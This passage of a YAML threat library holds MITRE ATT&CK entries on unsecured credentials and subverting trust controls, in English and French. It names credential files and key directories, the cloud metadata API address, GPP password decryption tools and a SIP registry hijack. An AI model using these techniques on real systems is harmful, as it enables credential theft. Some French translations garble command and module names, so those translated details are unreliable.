          \nSous Windows, PowerShell poss\xE8de \xE0 la fois un historique de commandes\
          \ effac\xE9 apr\xE8s la fin de la session, et un autre qui contient les\
          \ commandes utilis\xE9es dans toutes les sessions et qui est persistant.\
          \ L\u2019emplacement par d\xE9faut pour l\u2019historique persistant se\
          \ trouve dans \xAB %userprofile %\\AppData\\Roaming\\Microsoft\\Windows\\\
          PowerShell\\PSReadline\\ConsoleHost_history.txt \xBB, mais l\u2019historique\
          \ des commandes peut \xE9galement \xEAtre consult\xE9 via \xAB Get-History\
          \ \xBB. L\u2019invite de commande (CMD) sur Windows n\u2019a pas d\u2019\
          historique persistant. (Citation : Microsoft about_History)(Citation : Moyen)\n\
          \nLes utilisateurs tapent souvent des noms d\u2019utilisateur et des mots\
          \ de passe en ligne de commande comme param\xE8tres pour les programmes,\
          \ qui sont ensuite sauvegard\xE9s dans ce fichier lors de leur d\xE9connexion.\
          \ Les adversaires peuvent abuser de cela en fouillant le dossier \xE0 la\
          \ recherche de potentielles identifiants. (Citation : Externe \xE0 DA, \xE0\
          \ la mani\xE8re OS X)\nhttps://attack.mitre.org/techniques/T1552/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.004
    ref_id: T1552.004
    name: Private Keys
    description: "Adversaries may search for private key certificate files on compromised\
      \ systems for insecurely stored credentials. Private cryptographic keys and\
      \ certificates are used for authentication, encryption/decryption, and digital\
      \ signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate\
      \ file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer,\
      \ .p7b, .asc. \n\nAdversaries may also look in common key directories, such\
      \ as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code>\
      \ on Windows. Adversary tools may also search compromised systems for file extensions\
      \ relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation:\
      \ Palo Alto Prince of Persia)\n\nWhen a device is registered to Entra ID, a\
      \ device key and a transport key are generated and used to verify the device\u2019\
      s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access\
      \ to the device may be able to export the keys in order to impersonate the device.(Citation:\
      \ AADInternals Azure AD Device Identities)\n\nOn network devices, private keys\
      \ may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\n\
      Some private keys require a password or passphrase for operation, so an adversary\
      \ may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for\
      \ keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110)\
      \ the passphrase off-line. These private keys can be used to authenticate to\
      \ [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for\
      \ use in decrypting other collected files such as email.\nhttps://attack.mitre.org/techniques/T1552/004"
    translations:
      fr:
        name: "Cl\xE9s priv\xE9es"
        description: "Les adversaires peuvent rechercher des fichiers de certificats\
          \ \xE0 cl\xE9 priv\xE9e sur des syst\xE8mes compromis pour des identifiants\
          \ stock\xE9s de mani\xE8re non s\xE9curis\xE9e. Les cl\xE9s cryptographiques\
          \ priv\xE9es et les certificats sont utilis\xE9s pour l\u2019authentification,\
          \ le chiffrement/d\xE9chiffrement et les signatures num\xE9riques. (Citation\
          \ : Crypto \xE0 cl\xE9 publique Wikip\xE9dia) Les extensions courantes de\
          \ fichiers de cl\xE9s et de certificats incluent : .key, .pgp, .gpg, .ppk.,\
          \ .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nLes adversaires peuvent aussi\
          \ consulter des r\xE9pertoires de cl\xE9s courants, comme <code>~/.ssh</code>\
          \ pour les cl\xE9s SSH sur les syst\xE8mes \xE0 base de * nix ou <code>C\_\
          :\\Users\\(username)\\.ssh\\</code> sous Windows. Les outils adversaires\
          \ peuvent \xE9galement rechercher dans les syst\xE8mes compromis des extensions\
          \ de fichiers li\xE9es aux cl\xE9s et certificats cryptographiques. (Citation\
          \ : Kaspersky Careto)(Citation : Palo Alto Prince de Perse)\n\nLorsqu\u2019\
          un appareil est enregistr\xE9 \xE0 l\u2019identifiant Entra, une cl\xE9\
          \ de p\xE9riph\xE9rique et une cl\xE9 de transport sont g\xE9n\xE9r\xE9\
          es et utilis\xE9es pour v\xE9rifier l\u2019identit\xE9 de l\u2019appareil.\
          \ (Citation : Microsoft Primary Refresh Token) Un adversaire ayant acc\xE8\
          s \xE0 l\u2019appareil peut \xEAtre capable d\u2019exporter les cl\xE9s\
          \ afin d\u2019usurper l\u2019identit\xE9 de l\u2019appareil. (Citation :\
          \ AADInternals Azure AD Device Identities)\n\nSur les appareils r\xE9seau,\
          \ les cl\xE9s priv\xE9es peuvent \xEAtre export\xE9es via des commandes\
          \ [CLI du dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que \xAB crypto export pki \xBB. (Citation : cisco_deploy_rsa_keys)\
          \ \n\nCertaines cl\xE9s priv\xE9es n\xE9cessitent un mot de passe ou une\
          \ phrase secr\xE8te pour fonctionner, donc un adversaire peut aussi utiliser\
          \ [Capture d\u2019entr\xE9e](https://attack.mitre.org/techniques/T1056)\
          \ pour le keylogging ou tenter de [Brute Force](https://attack.mitre.org/techniques/T1110)\
          \ la phrase secr\xE8te hors ligne. Ces cl\xE9s priv\xE9es peuvent \xEAtre\
          \ utilis\xE9es pour s\u2019authentifier aupr\xE8s de [Services Distantes](https://attack.mitre.org/techniques/T1021)\
          \ comme SSH ou pour d\xE9chiffrer d\u2019autres fichiers collect\xE9s comme\
          \ les e-mails.\nhttps://attack.mitre.org/techniques/T1552/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.005
    ref_id: T1552.005
    name: Cloud Instance Metadata API
    description: 'Adversaries may attempt to access the Cloud Instance Metadata API
      to collect credentials and other sensitive data.


      Most cloud service providers support a Cloud Instance Metadata API which is
      a service provided to running virtual instances that allows applications to
      access information about the running virtual instance. Available information
      generally includes name, security group, and additional metadata including sensitive
      data such as credentials and UserData scripts that may contain additional secrets.
      The Instance Metadata API is provided as a convenience to assist in managing
      applications and is accessible by anyone who can access the instance.(Citation:
      AWS Instance Metadata API) A cloud metadata API has been used in at least one
      high profile compromise.(Citation: Krebs Capital One August 2019)


      If adversaries have a presence on the running virtual instance, they may query
      the Instance Metadata API directly to identify credentials that grant access
      to additional resources. Additionally, adversaries may exploit a Server-Side
      Request Forgery (SSRF) vulnerability in a public facing web proxy that allows
      them to gain access to the sensitive information via a request to the Instance
      Metadata API.(Citation: RedLock Instance Metadata API 2018)


      The de facto standard across cloud service providers is to host the Instance
      Metadata API at <code>http[:]//169.254.169.254</code>.

      https://attack.mitre.org/techniques/T1552/005'
    translations:
      fr:
        name: "API de m\xE9tadonn\xE9es d\u2019instance cloud"
        description: "Les adversaires peuvent tenter d\u2019acc\xE9der \xE0 l\u2019\
          API de m\xE9tadonn\xE9es d\u2019instance cloud pour collecter des identifiants\
          \ et d\u2019autres donn\xE9es sensibles.\n\nLa plupart des fournisseurs\
          \ de services cloud prennent en charge une API de m\xE9tadonn\xE9es d\u2019\
          instance cloud, un service fourni aux instances virtuelles en cours de cours\
          \ permettant aux applications d\u2019acc\xE9der aux informations sur l\u2019\
          instance virtuelle en cours. Les informations disponibles incluent g\xE9\
          n\xE9ralement le nom, le groupe de s\xE9curit\xE9 et des m\xE9tadonn\xE9\
          es suppl\xE9mentaires, y compris des donn\xE9es sensibles telles que des\
          \ identifiants et des scripts UserData pouvant contenir des secrets suppl\xE9\
          mentaires. L\u2019API de m\xE9tadonn\xE9es d\u2019instance est fournie pour\
          \ faciliter la gestion des applications et est accessible \xE0 toute personne\
          \ pouvant acc\xE9der \xE0 l\u2019instance. (Citation : API de m\xE9tadonn\xE9\
          es d\u2019instance AWS) Une API de m\xE9tadonn\xE9es cloud a \xE9t\xE9 utilis\xE9\
          e dans au moins une compromission tr\xE8s m\xE9diatis\xE9e. (Citation :\
          \ Krebs Capital One ao\xFBt 2019)\n\nSi des adversaires sont pr\xE9sents\
          \ sur l\u2019instance virtuelle en cours, ils peuvent interroger directement\
          \ l\u2019API de m\xE9tadonn\xE9es d\u2019instance pour identifier les identifiants\
          \ qui accordent l\u2019acc\xE8s \xE0 des ressources suppl\xE9mentaires.\
          \ De plus, les adversaires peuvent exploiter une vuln\xE9rabilit\xE9 de\
          \ falsification de requ\xEAte c\xF4t\xE9 serveur (SSRF) dans un proxy web\
          \ public qui leur permet d\u2019acc\xE9der aux informations sensibles via\
          \ une requ\xEAte \xE0 l\u2019API de m\xE9tadonn\xE9es d\u2019instance. (Citation\
          \ : API de m\xE9tadonn\xE9es d\u2019instance RedLock 2018)\n\nLa norme de\
          \ facto parmi les fournisseurs de services cloud est d\u2019h\xE9berger\
          \ l\u2019API de m\xE9tadonn\xE9es d\u2019instance \xE0 <code>http[\_:]//169.254.169.254.</code>\n\
          https://attack.mitre.org/techniques/T1552/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.006
    ref_id: T1552.006
    name: Group Policy Preferences
    description: "Adversaries may attempt to find unsecured credentials in Group Policy\
      \ Preferences (GPP). GPP are tools that allow administrators to create domain\
      \ policies with embedded credentials. These policies allow administrators to\
      \ set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies\
      \ are stored in SYSVOL on a domain controller. This means that any domain user\
      \ can view the SYSVOL share and decrypt the password (using the AES key that\
      \ has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools\
      \ and scripts can be used to gather and decrypt the password file from Group\
      \ Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module:\
      \ <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation:\
      \ Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share,\
      \ adversaries may use the following command to enumerate potential GPP XML files:\
      \ <code>dir /s * .xml</code>\nhttps://attack.mitre.org/techniques/T1552/006"
    translations:
      fr:
        name: "Pr\xE9f\xE9rences de politique de groupe"
        description: "Les adversaires peuvent tenter de trouver des identifiants non\
          \ s\xE9curis\xE9s dans les Pr\xE9f\xE9rences de Politique de Groupe (GPP).\
          \ Les GPP sont des outils qui permettent aux administrateurs de cr\xE9er\
          \ des politiques de domaine avec des identifiants int\xE9gr\xE9s. Ces politiques\
          \ permettent aux administrateurs de d\xE9finir des comptes locaux. (Citation\
          \ : Microsoft GPP 2016)\n\nCes politiques de groupe sont stock\xE9es dans\
          \ SYSVOL sur un contr\xF4leur de domaine. Cela signifie que tout utilisateur\
          \ de domaine peut consulter le partage SYSVOL et d\xE9chiffrer le mot de\
          \ passe (en utilisant la cl\xE9 AES qui a \xE9t\xE9 rendue publique). (Citation\
          \ : Cl\xE9 Microsoft GPP)\n\nLes outils et scripts suivants peuvent \xEA\
          tre utilis\xE9s pour collecter et d\xE9chiffrer le fichier de mot de passe\
          \ \xE0 partir des fichiers XML de pr\xE9f\xE9rence de politique de groupe\
          \ :\n\n* Module post-exploitation de Metasploit : <code>post/windows/rassembler/credentials/gpp</code>\n\
          * Get-GPPPassword (Citation : Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\
          \nSur le partage SYSVOL, les adversaires peuvent utiliser la commande suivante\
          \ pour \xE9num\xE9rer les fichiers XML GPP potentiels : <code>dir /s * .xml</code>\n\
          https://attack.mitre.org/techniques/T1552/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.007
    ref_id: T1552.007
    name: Container API
    description: 'Adversaries may gather credentials via APIs within a containers
      environment. APIs in these environments, such as the Docker API and Kubernetes
      APIs, allow a user to remotely manage their container resources and cluster
      components.(Citation: Docker API)(Citation: Kubernetes API)


      An adversary may access the Docker API to collect logs that contain credentials
      to cloud, container, and various other resources in the environment.(Citation:
      Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions,
      such as via a pod''s service account, may also use the Kubernetes API to retrieve
      credentials from the Kubernetes API server. These credentials may include those
      needed for Docker API authentication or secrets from Kubernetes cluster components.

      https://attack.mitre.org/techniques/T1552/007'
    translations:
      fr:
        name: API conteneur
        description: "Les adversaires peuvent recueillir des identifiants via des\
          \ API dans un environnement de conteneurs. Les API dans ces environnements,\
          \ telles que les API Docker et Kubernetes, permettent \xE0 un utilisateur\
          \ de g\xE9rer \xE0 distance ses ressources conteneurs et ses composants\
          \ de cluster. (Citation : API Docker)(Citation : API Kubernetes)\n\nUn adversaire\
          \ peut acc\xE9der \xE0 l\u2019API Docker pour collecter des journaux contenant\
          \ des identifiants vers le cloud, le conteneur et diverses autres ressources\
          \ de l\u2019environnement. (Citation : D\xE9mons dockers non s\xE9curis\xE9\
          s de l\u2019Unit\xE9 42) Un adversaire disposant d\u2019autorisations suffisantes,\
          \ comme via le compte de service d\u2019un pod, peut \xE9galement utiliser\
          \ l\u2019API Kubernetes pour r\xE9cup\xE9rer des identifiants depuis le\
          \ serveur API Kubernetes. Ces identifiants peuvent inclure ceux n\xE9cessaires\
          \ \xE0 l\u2019authentification de l\u2019API Docker ou des secrets issus\
          \ des composants du cluster Kubernetes.\nhttps://attack.mitre.org/techniques/T1552/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.008
    ref_id: T1552.008
    name: Chat Messages
    description: 'Adversaries may directly collect unsecured credentials stored or
      passed through user communication services. Credentials may be sent and stored
      in user chat communication applications such as email, chat services like Slack
      or Teams, collaboration tools like Jira or Trello, and any other services that
      support user communication. Users may share various forms of credentials (such
      as usernames and passwords, API keys, or authentication tokens) on private or
      public corporate internal communications channels.


      Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)),
      adversaries may directly access credentials within these services on the user
      endpoint, through servers hosting the services, or through administrator portals
      for cloud hosted services. Adversaries may also compromise integration tools
      like Slack Workflows to automatically search through messages to extract user
      credentials. These credentials may then be abused to perform follow-on activities
      such as lateral movement or privilege escalation (Citation: Slack Security Risks).

      https://attack.mitre.org/techniques/T1552/008'
    translations:
      fr:
        name: Messages de discussion
        description: "Les adversaires peuvent directement collecter des identifiants\
          \ non s\xE9curis\xE9s stock\xE9s ou transmis via des services de communication\
          \ utilisateur. Les identifiants peuvent \xEAtre envoy\xE9s et stock\xE9\
          s dans des applications de communication par chat utilisateur telles que\
          \ l\u2019email, des services de chat comme Slack ou Teams, des outils de\
          \ collaboration comme Jira ou Trello, et tout autre service qui supporte\
          \ la communication utilisateur. Les utilisateurs peuvent partager diverses\
          \ formes d\u2019identifiants (tels que des noms d\u2019utilisateur et mots\
          \ de passe, des cl\xE9s API ou des jetons d\u2019authentification) sur des\
          \ canaux de communication internes priv\xE9s ou publics d\u2019entreprise.\n\
          \nPlut\xF4t que d\u2019acc\xE9der aux journaux de discussion stock\xE9s\
          \ (c\u2019est-\xE0-dire [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)),\
          \ les adversaires peuvent acc\xE9der directement aux identifiants de ces\
          \ services sur le point d\u2019acc\xE8s utilisateur, via les serveurs h\xE9\
          bergeant les services, ou via des portails administrateur pour les services\
          \ h\xE9berg\xE9s dans le cloud. Les adversaires peuvent \xE9galement compromettre\
          \ des outils d\u2019int\xE9gration comme Slack Workflows pour effectuer\
          \ une recherche automatique dans les messages afin d\u2019extraire les identifiants\
          \ utilisateurs. Ces identifiants peuvent alors \xEAtre abus\xE9s pour effectuer\
          \ des activit\xE9s ult\xE9rieures telles que des mouvements lat\xE9raux\
          \ ou l\u2019escalade de privil\xE8ges (Citation : Slack Security Risks).\n\
          https://attack.mitre.org/techniques/T1552/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553
    ref_id: T1553
    name: Subvert Trust Controls
    description: 'Adversaries may undermine security controls that will either warn
      users of untrusted activity or prevent execution of untrusted programs. Operating
      systems and security products may contain mechanisms to identify programs or
      websites as possessing some level of trust. Examples of such features would
      include a program being allowed to run because it is signed by a valid code
      signing certificate, a program prompting the user with a warning because it
      has an attribute set from being downloaded from the Internet, or getting an
      indication that you are about to connect to an untrusted site.


      Adversaries may attempt to subvert these trust mechanisms. The method adversaries
      use will depend on the specific mechanism they seek to subvert. Adversaries
      may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222)
      or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of
      subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017)
      Adversaries may also create or steal code signing certificates to acquire trust
      on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec
      Digital Certificates)

      https://attack.mitre.org/techniques/T1553'
    translations:
      fr:
        name: "Subvertir les contr\xF4les de confiance"
        description: "Les adversaires peuvent saper les contr\xF4les de s\xE9curit\xE9\
          \ qui avertiraient les utilisateurs d\u2019une activit\xE9 non fiable ou\
          \ emp\xEAcheront l\u2019ex\xE9cution de programmes non fiables. Les syst\xE8\
          mes d\u2019exploitation et produits de s\xE9curit\xE9 peuvent contenir des\
          \ m\xE9canismes permettant d\u2019identifier les programmes ou sites web\
          \ comme disposant d\u2019un certain niveau de confiance. Des exemples de\
          \ telles fonctionnalit\xE9s incluraient un programme autoris\xE9 \xE0 s\u2019\
          ex\xE9cuter parce qu\u2019il est sign\xE9 par un certificat de signature\
          \ de code valide, un programme qui invite l\u2019utilisateur \xE0 avertir\
          \ parce qu\u2019il poss\xE8de un attribut d\xE9fini depuis le t\xE9l\xE9\
          chargement d\u2019Internet, ou une indication que vous \xEAtes sur le point\
          \ de vous connecter \xE0 un site non fiable.\n\nLes adversaires peuvent\
          \ tenter de subvertir ces m\xE9canismes de confiance. La m\xE9thode utilis\xE9\
          e par les adversaires d\xE9pendra du m\xE9canisme sp\xE9cifique qu\u2019\
          ils cherchent \xE0 subvertir. Les adversaires peuvent effectuer la [modification\
          \ des permissions de fichier et d\u2019annuaire](https://attack.mitre.org/techniques/T1222)\
          \ ou [modification du registre](https://attack.mitre.org/techniques/T1112)\
          \ pour soutenir la d\xE9version de ces contr\xF4les. (Citation : SpectorOps\
          \ Subverting Trust sept. 2017) Les adversaires peuvent \xE9galement cr\xE9\
          er ou voler des certificats de signature de code pour gagner la confiance\
          \ dans les syst\xE8mes cibles. (Citation : Certificats num\xE9riques Securelist)(Citation\
          \ : Certificats num\xE9riques Symantec)\nhttps://attack.mitre.org/techniques/T1553"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.001
    ref_id: T1553.001
    name: Gatekeeper Bypass
    description: "Adversaries may modify file attributes and subvert Gatekeeper functionality\
      \ to evade user prompts and execute untrusted programs. Gatekeeper is a set\
      \ of technologies that act as layer of Apple\u2019s security model to ensure\
      \ only trusted applications are executed on a host. Gatekeeper was built on\
      \ top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include\
      \ Code Signing, security policy compliance, Notarization, and more. Gatekeeper\
      \ also treats applications running for the first time differently than reopened\
      \ applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation:\
      \ TheEclecticLightCompany apple notarization )\n\nBased on an opt-in system,\
      \ when files are downloaded an extended attribute (xattr) called `com.apple.quarantine`\
      \ (also known as a quarantine flag) can be set on the file by the application\
      \ performing the download. Launch Services opens the application in a suspended\
      \ state. For first run applications with the quarantine flag set, Gatekeeper\
      \ executes the following functions:\n\n1. Checks extended attribute \u2013 Gatekeeper\
      \ checks for the quarantine flag, then provides an alert prompt to the user\
      \ to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS\
      \ Common Tools and Techniques)\n\n2. Checks System Policies - Gatekeeper checks\
      \ the system security policy, allowing execution of apps downloaded from either\
      \ just the App Store or the App Store and identified developers.\n\n3. Code\
      \ Signing \u2013 Gatekeeper checks for a valid code signature from an Apple\
      \ Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API,\
      \ Gatekeeper reaches out to Apple servers to verify or pull down the notarization\
      \ ticket and ensure the ticket is not revoked. Users can override notarization,\
      \ which will result in a prompt of executing an \u201Cunauthorized app\u201D\
      \ and the security policy will be modified.\n\nAdversaries can subvert one or\
      \ multiple security controls within Gatekeeper checks through logic errors (e.g.\
      \ [Exploitation for Stealth](https://attack.mitre.org/techniques/T1211)), unchecked\
      \ file types, and external libraries. For example, prior to macOS 13 Ventura,\
      \ code signing and notarization checks were only conducted on first launch,\
      \ allowing adversaries to write malicious executables to previously opened applications\
      \ in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper\
      \ bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)\n\n\
      Applications and files loaded onto the system from a USB flash drive, optical\
      \ disk, external hard drive, from a drive shared over the local network, or\
      \ using the curl command may not set the quarantine flag. Additionally, it is\
      \ possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).\n\
      https://attack.mitre.org/techniques/T1553/001"
    translations:
      fr:
        name: "D\xE9viation de Gatekeeper"
        description: "Les adversaires peuvent modifier les attributs des fichiers\
          \ et subvertir la fonctionnalit\xE9 de Gatekeeper pour contourner les invites\
          \ utilisateur et ex\xE9cuter des programmes non fiables. Gatekeeper est\
          \ un ensemble de technologies qui agissent comme une couche du mod\xE8le\
          \ de s\xE9curit\xE9 d\u2019Apple afin de garantir que seules des applications\
          \ de confiance soient ex\xE9cut\xE9es sur un h\xF4te. Gatekeeper a \xE9\
          t\xE9 construit sur la quarantaine des fichiers dans Snow Leopard (10.6,\
          \ 2009) et s\u2019est d\xE9velopp\xE9 pour inclure la signature de code,\
          \ la conformit\xE9 aux politiques de s\xE9curit\xE9, la notarisation, et\
          \ plus encore. Gatekeeper traite \xE9galement les applications qui s\u2019\
          ex\xE9cutent diff\xE9remment des applications rouvertes. (Citation : Quarantaine\
          \ de la Compagnie \xC9clectique et le drapeau)(Citation : notarisation de\
          \ pommes TheEclecticLightCompany )\n\nBas\xE9 sur un syst\xE8me d\u2019\
          adh\xE9sion volontaire, lorsque des fichiers sont t\xE9l\xE9charg\xE9s,\
          \ un attribut \xE9tendu (xattr) appel\xE9 \xAB com.apple.quarantine \xBB\
          \ (\xE9galement appel\xE9 drapeau de quarantaine) peut \xEAtre d\xE9fini\
          \ sur le fichier par l\u2019application effectuant le t\xE9l\xE9chargement.\
          \ Les Services de lancement ouvrent la demande en \xE9tat de suspension.\
          \ Pour les applications de premi\xE8re ex\xE9cution avec le drapeau de quarantaine\
          \ d\xE9fini, Gatekeeper ex\xE9cute les fonctions suivantes :\n\n1. V\xE9\
          rifie l\u2019attribut \xE9tendu \u2013 Le gardienne v\xE9rifie le drapeau\
          \ de quarantaine, puis fournit une alerte \xE0 l\u2019utilisateur pour autoriser\
          \ ou refuser l\u2019ex\xE9cution. (Citation : OceanLotus pour OS X)(Citation\
          \ : 20 outils et techniques courants sur macOS)\n\n2. Contr\xF4le des politiques\
          \ syst\xE8me - Gatekeeper v\xE9rifie la politique de s\xE9curit\xE9 syst\xE8\
          me, permettant l\u2019ex\xE9cution des applications t\xE9l\xE9charg\xE9\
          es uniquement depuis l\u2019App Store ou l\u2019App Store et identifiant\
          \ les d\xE9veloppeurs.\n\n3. Signature de code \u2013 Gatekeeper v\xE9rifie\
          \ une signature de code valide \xE0 partir d\u2019un ID d\xE9veloppeur Apple.\n\
          \n4. Notarisation - \xC0 l\u2019aide de l\u2019API \xAB api.apple-cloudkit.com\
          \ \xBB, Gatekeeper contacte les serveurs Apple pour v\xE9rifier ou supprimer\
          \ le ticket de notarisation et s\u2019assurer que le ticket n\u2019est pas\
          \ r\xE9voqu\xE9. Les utilisateurs peuvent passer outre la notarisation,\
          \ ce qui entra\xEEnera une invite d\u2019ex\xE9cution d\u2019une \xAB application\
          \ non autoris\xE9e \xBB et la politique de s\xE9curit\xE9 sera modifi\xE9\
          e.\n\nLes adversaires peuvent contourner un ou plusieurs contr\xF4les de\
          \ s\xE9curit\xE9 dans les contr\xF4les Gatekeeper \xE0 cause d\u2019erreurs\
          \ logiques (par exemple [Exploitation pour furtivit\xE9](https://attack.mitre.org/techniques/T1211)),\
          \ de types de fichiers non coch\xE9s et de biblioth\xE8ques externes. Par\
          \ exemple, avant macOS 13 Ventura, les v\xE9rifications de signature de\
          \ code et de notarisation n\u2019\xE9taient effectu\xE9es qu\u2019au premier\
          \ lancement, permettant aux adversaires d\u2019\xE9crire des ex\xE9cutables\
          \ malveillants sur des applications d\xE9j\xE0 ouvertes afin de contourner\
          \ les contr\xF4les de s\xE9curit\xE9 Gatekeeper. (Citation : contournement\
          \ du gatekeeper du vilbit 2021)(Citation : Manipulation du bundle d\u2019\
          applications Brandon Dalton)\n\nLes applications et fichiers charg\xE9s\
          \ sur le syst\xE8me depuis une cl\xE9 USB, un disque optique, un disque\
          \ dur externe, un disque partag\xE9 via le r\xE9seau local ou via la commande\
          \ curl peuvent ne pas activer le drapeau de quarantaine. De plus, il est\
          \ possible d\u2019\xE9viter de d\xE9finir le drapeau de quarantaine en utilisant\
          \ [Compromission en voiture](https://attack.mitre.org/techniques/T1189).\n\
          https://attack.mitre.org/techniques/T1553/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.002
    ref_id: T1553.002
    name: Code Signing
    description: 'Adversaries may create, acquire, or steal code signing materials
      to sign their malware or tools. Code signing provides a level of authenticity
      on a binary from the developer and a guarantee that the binary has not been
      tampered with. (Citation: Wikipedia Code Signing) The certificates used during
      an operation may be created, acquired, or stolen by the adversary. (Citation:
      Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike
      [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this
      activity will result in a valid signature.


      Code signing to verify software on first run can be used on modern Windows and
      macOS systems. It is not used on Linux due to the decentralized nature of the
      platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)


      Code signing certificates may be used to bypass security policies that require
      signed code to execute on a system.

      https://attack.mitre.org/techniques/T1553/002'
    translations:
      fr:
        name: Signature de codes
        description: "Les adversaires peuvent cr\xE9er, acqu\xE9rir ou voler des documents\
          \ de signature de code pour signer leurs logiciels malveillants ou outils.\
          \ La signature de code offre un niveau d\u2019authenticit\xE9 sur un binaire\
          \ provenant du d\xE9veloppeur et une garantie que le binaire n\u2019a pas\
          \ \xE9t\xE9 alt\xE9r\xE9. (Citation : Signature de code Wikip\xE9dia) Les\
          \ certificats utilis\xE9s lors d\u2019une op\xE9ration peuvent \xEAtre cr\xE9\
          \xE9s, acquis ou vol\xE9s par l\u2019adversaire. (Citation : Certificats\
          \ num\xE9riques Securelist) (Citation : Certificats num\xE9riques Symantec)\
          \ Contrairement \xE0 [Signature de code invalide](https://attack.mitre.org/techniques/T1036/001),\
          \ cette activit\xE9 aboutira \xE0 une signature valide.\n\nLa signature\
          \ de code pour v\xE9rifier le logiciel lors de la premi\xE8re ex\xE9cution\
          \ peut \xEAtre utilis\xE9e sur les syst\xE8mes Windows et macOS modernes.\
          \ Il n\u2019est pas utilis\xE9 sur Linux en raison de la nature d\xE9centralis\xE9\
          e de la plateforme. (Citation : Signature de code Wikip\xE9dia)(Citation\
          \ : \xC9clectiqueLightChecksonEX\xC9CUTIFSigneCarte)\n\nLes certificats\
          \ de signature de code peuvent \xEAtre utilis\xE9s pour contourner les politiques\
          \ de s\xE9curit\xE9 qui n\xE9cessitent un code sign\xE9 pour s\u2019ex\xE9\
          cuter sur un syst\xE8me.\nhttps://attack.mitre.org/techniques/T1553/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.003
    ref_id: T1553.003
    name: SIP and Trust Provider Hijacking
    description: "Adversaries may tamper with SIP and trust provider components to\
      \ mislead the operating system and application control tools when conducting\
      \ signature validation checks. In user mode, Windows Authenticode (Citation:\
      \ Microsoft Authenticode) digital signatures are used to verify a file's origin\
      \ and integrity, variables that may be used to establish trust in signed code\
      \ (ex: a driver with a valid Microsoft signature may be handled as safe). The\
      \ signature validation process is handled via the WinVerifyTrust application\
      \ programming interface (API) function,  (Citation: Microsoft WinVerifyTrust)\
      \ which accepts an inquiry and coordinates with the appropriate trust provider,\
      \ which is responsible for validating parameters of a signature. (Citation:\
      \ SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable\
      \ file types and corresponding signature formats, Microsoft created software\
      \ components called Subject Interface Packages (SIPs) (Citation: EduardosBlog\
      \ SIPs July 2008) to provide a layer of abstraction between API functions and\
      \ files. SIPs are responsible for enabling API functions to create, retrieve,\
      \ calculate, and verify signatures. Unique SIPs exist for most file formats\
      \ (Executable, PowerShell, Installer, etc., with catalog signing providing a\
      \ catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017))\
      \ and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps\
      \ Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002),\
      \ adversaries may abuse this architecture to subvert trust controls and bypass\
      \ security policies that allow only legitimately signed code to execute on a\
      \ system. Adversaries may hijack SIP and trust provider components to mislead\
      \ operating system and application control tools to classify malicious (or any)\
      \ code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n*\
      \ Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in\
      \ <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType\
      \ 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic\
      \ link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function,\
      \ which retrieves an encoded digital certificate from a signed file. By pointing\
      \ to a maliciously-crafted DLL with an exported function that always returns\
      \ a known good signature value (ex: a Microsoft signature for Portable Executables)\
      \ rather than the file\u2019s real signature, an adversary can apply an acceptable\
      \ signature value to all files using that SIP (Citation: GitHub SIP POC Sept\
      \ 2017) (although a hash mismatch will likely occur, invalidating the signature,\
      \ since the hash returned by the function will not match the value computed\
      \ from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code>\
